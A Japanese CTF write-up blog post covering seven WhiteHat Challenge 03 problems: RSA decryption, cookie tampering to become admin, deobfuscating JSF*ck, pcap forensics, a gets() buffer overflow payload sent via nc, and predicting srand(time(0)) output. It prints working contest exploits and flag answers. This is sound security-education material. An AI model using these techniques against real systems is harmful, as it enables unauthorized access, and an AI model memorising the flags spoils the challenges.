---
layout: post
title: WhiteHat Challenge 03 の write-up
categories: [ctf]
date: 2017-04-27 19:47:00 +0900
---

チーム Harekaze で [WhiteHat Challenge 03](https://wargame.whitehat.vn/Contests/ChallengesContest/36) に参加しました。最終的にチームで 115 点を獲得し、順位は 24 位 (得点 101 チーム中) でした。うち、私は 7 問を解いて 115 点を入れました。

以下、解いた問題の write-up です。

## [Cryptography 10] Crypto002

RSA で暗号化された暗号文とその他もろもろ (n, p, q, e) が与えられました。

p と q まで与えられているので、これを使って暗号文を復号すると `simple_rsa_decryption` が得られました。

```
WhiteHat{100be37579e0f27c314efcb68a773b31537b5118}
```

## [Web Security 20] Web001

与えられた URL にアクセスするとログインフォームが表示されました。

ソースを見ると `<!-- test/test -->` とあります。ユーザ名とパスワードに `test` を入力するとログインができました。が、フラグは `admin` でないと見られないようです。

Cookie を見ると `user=test` がセットされていました。`user=admin` に変えると `don't_believe_cookies_at_all` と表示されました。

```
WhiteHat{92b2bc2f657574ab3481ebcb6705c36079b3e6d7}
```

## [Web Security 15] Web002

パスワードのチェックをする HTML が与えられます。ソースを見ると、どうやら JSF*ck で難読化されているようです。

試しに適当なパスワードを入力してみると、alert が表示されました。

`alert = () => { debugger; };` してもう一度適当なパスワードを入力すると、コールスタックにパスワードのチェックをする関数が乗っていました。どうやらパスワードは `wonert1sf7kz` のようです。

このパスワードでログインすると `easy_javascript_right?` と表示されました。

```
WhiteHat{9f1a7c9986e0ce43e383935ac88d37e77a659996}
```

## [Forensics 15] For001

pcapng ファイルが与えられます。pcap ファイルに変換して binwalk に投げてみると以下のような結果になりました。

```
$ binwalk a.pcap

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
84991         0x14BFF         Zip archive data, at least v1.0 to extract, name: Flag/
85054         0x14C3E         Zip archive data, at least v2.0 to extract, compressed size: 49, uncompressed size: 50, name: Flag/flag.txt
85332         0x14D54         End of Zip archive, footer length: 22
```

zip を取り出して展開するとフラグが出てきました。

```
WhiteHat{3244495470c50733ac0d93b7b4f8c6d12eaba65c}
```

## [Forensics 15] For002

pcap ファイルが与えられます。問題文によるとフラグはユーザがログインに使ったパスワードのようです。

適当に眺めていると `POST /accounts/login/` している HTTP リクエストが見つかりました。この中に `password=%40Bkav123%23%24challange3` とパスワードがありました。

```
WhiteHat{0d712cbea97819fa1e1c0a605283b1b912bcf350}
```

## [Pwnable 20] Pwn001

バイナリファイルが与えられます。試しに動かしてみると、以下のようになりました。

```
$ file ./zombie_overflow
./zombie_overflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=3ab0794729156ef1514cf67df500b6e6815c30f5, not stripped
$ ./zombie_overflow
Zombie apocalypse!!!!What will you do now, little boy?
Your weapon : ho
Your action : ge
Your live percentage is: 0xdead
You did it! Except some bite on your arm :O
```

少し解析してみると、どうやら体力が 0xc0de の時に `cat flag.txt` がされるようです。

また、weapon と action の入力に gets が使われているため、体力まで書き換えることが出来るようです。

```
$ python -c "import struct; print 'A' * 256 + struct.pack('<I', 0xc0de) + '\n' + 'a'" | nc 103.237.99.35 25033
Zombie apocalypse!!!!What will you do now, little boy?
Your weapon : Your action : Your live percentage is: 0xc0de
My great survivor!
Here is your prize: w4nt_t0_b3_4_z0mb1e_som3t1me_r1ght?
```

```
WhiteHat{80092863ba83401ace933e149a165bab1155c4f3}
```

## [Pwnable 20] Pwn002

`nc 103.237.98.32 25032` というコマンドだけが与えられました。試しに接続してみると、以下のようになりました。

```
$ nc 103.237.98.32 25032

I have two secret numbers, I like you guessing them. Are you ready?

        The first challenge: guessing one,
Enter your number:100
You've guessed incorrectly. Don't give up! Try again with a number between 100 and 1000.
```

100 から 1000 まで全部試してみましょう。

```
$ for i in {100..1000}; do echo $i; echo $i | nc 103.237.98.32 25032; done
...
576

I have two secret numbers, I like you guessing them. Are you ready?

        The first challenge: guessing one,
Enter your number:Well done! The secret numer is 576. Pass challenge 2 to get the flag

        Challenge 2: Guessing the second
Now,Guessing the second one. I use srand() function in C with argument time(0).
Enter your number:
...
```

1 つ目の数字は 576 だったようです。2 つ目の数字もどうやって生成しているか教えてくれているので、適当に当てましょう。

```
$ cat a.c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
int main(void) {
  srand(time(NULL));
  puts("576");
  printf("%d\n", rand());
  return 0;
}
$ gcc a.c -o a && ./a | nc 103.237.98.32 25032

I have two secret numbers, I like you guessing them. Are you ready?

        The first challenge: guessing one,
Enter your number:Well done! The secret numer is 576. Pass challenge 2 to get the flag

        Challenge 2: Guessing the second
Now,Guessing the second one. I use srand() function in C with argument time(0).
Enter your number:
Amazing !You are right. Flag is: Life_is_a_story_make_yours_the_best_seller.
```

```
WhiteHat{1d97317719f904bebb9950a5334e6af839992515}
```
